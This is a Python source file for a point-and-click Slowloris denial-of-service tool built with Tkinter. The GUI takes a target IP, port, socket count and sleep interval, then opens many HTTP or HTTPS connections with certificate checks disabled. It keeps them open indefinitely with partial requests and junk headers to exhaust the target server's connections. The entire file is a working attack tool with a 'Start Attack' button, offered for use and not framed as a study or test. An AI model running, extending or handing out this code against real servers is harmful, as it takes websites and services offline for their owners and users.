import tkinter as tk
from tkinter import messagebox
import threading
import socket
import random
import ssl
import time

# Slowloris function (from the original script)
def init_socket(ip, port, use_https, rand_user_agents, user_agents):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    if use_https:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=ip)

    s.connect((ip, port))

    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

    ua = user_agents[0]
    if rand_user_agents:
        ua = random.choice(user_agents)

    s.send_header("User-Agent", ua)
    s.send_header("Accept-language", "en-US,en,q=0.5")
    return s

def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))

def send_header(self, name, value):
    self.send_line(f"{name}: {value}")

socket.socket.send_line = send_line
socket.socket.send_header = send_header

def slowloris_attack(ip, port, sockets_count, use_https, rand_user_agents, sleeptime):
    list_of_sockets = []
    user_agents = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        # Add other user agents as needed...
    ]
    
    def slowloris_iteration():
        for s in list(list_of_sockets):
            try:
                s.send_header("X-a", random.randint(1, 5000))
            except socket.error:
                list_of_sockets.remove(s)

        diff = sockets_count - len(list_of_sockets)
        for _ in range(diff):
            try:
                s = init_socket(ip, port, use_https, rand_user_agents, user_agents)
                if not s:
                    continue
                list_of_sockets.append(s)
            except socket.error:
                break
    
    for _ in range(sockets_count):
        try:
            s = init_socket(ip, port, use_https, rand_user_agents, user_agents)
            list_of_sockets.append(s)
        except socket.error:
            break

    while True:
        slowloris_iteration()
        time.sleep(sleeptime)

# Function to start the attack
def start_attack():
    ip = ip_entry.get()
    port = int(port_entry.get())
    sockets_count = int(sockets_entry.get())
    use_https = https_var.get()
    rand_user_agents = rand_ua_var.get()
    sleeptime = int(sleeptime_entry.get())
    
    if not ip:
        messagebox.showerror("Error", "Please enter a valid IP address.")
        return
    
    # Run the attack in a separate thread
    threading.Thread(target=slowloris_attack, args=(ip, port, sockets_count, use_https, rand_user_agents, sleeptime)).start()
    messagebox.showinfo("Started", "Slowloris attack started.")

# Creating the main application window
root = tk.Tk()
root.title("Slowloris GUI")

# IP Address
tk.Label(root, text="Target IP:").grid(row=0, column=0, padx=5, pady=5)
ip_entry = tk.Entry(root)
ip_entry.grid(row=0, column=1, padx=5, pady=5)

# Port
tk.Label(root, text="Port:").grid(row=1, column=0, padx=5, pady=5)
port_entry = tk.Entry(root)
port_entry.grid(row=1, column=1, padx=5, pady=5)
port_entry.insert(0, "80")

# Number of Sockets
tk.Label(root, text="Number of Sockets:").grid(row=2, column=0, padx=5, pady=5)
sockets_entry = tk.Entry(root)
sockets_entry.grid(row=2, column=1, padx=5, pady=5)
sockets_entry.insert(0, "150")

# Use HTTPS
https_var = tk.BooleanVar()
tk.Checkbutton(root, text="Use HTTPS", variable=https_var).grid(row=3, column=0, columnspan=2, padx=5, pady=5)

# Randomize User Agents
rand_ua_var = tk.BooleanVar()
tk.Checkbutton(root, text="Randomize User Agents", variable=rand_ua_var).grid(row=4, column=0, columnspan=2, padx=5, pady=5)

# Sleeptime
tk.Label(root, text="Sleeptime (seconds):").grid(row=5, column=0, padx=5, pady=5)
sleeptime_entry = tk.Entry(root)
sleeptime_entry.grid(row=5, column=1, padx=5, pady=5)
sleeptime_entry.insert(0, "15")

# Start Button
start_button = tk.Button(root, text="Start Attack", command=start_attack)
start_button.grid(row=6, column=0, columnspan=2, padx=5, pady=10)

# Start the GUI loop
root.mainloop()
